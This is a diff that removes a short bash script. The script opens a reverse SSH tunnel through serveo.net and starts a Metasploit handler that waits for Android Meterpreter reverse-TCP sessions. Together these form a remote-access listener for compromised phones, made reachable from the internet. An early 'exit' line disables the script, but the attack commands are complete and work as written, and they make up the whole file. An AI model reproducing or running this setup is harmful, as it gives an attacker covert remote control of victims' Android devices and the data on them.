@@ -1,7 +1,0 @@
-#!/bin/bash
-#Author IkeDarien
-echo Obsolete
-exit
-sudo echo OK
-sudo xfce4-terminal -x sudo ssh -vvv -R 25492:localhost:2492 serveo.net &
-sudo xfce4-terminal -x sudo msfconsole -q -x 'use exploit/multi/handler;set payload android/meterpreter/reverse_tcp;set LHOST localhost;set LPORT 2492;exploit' &
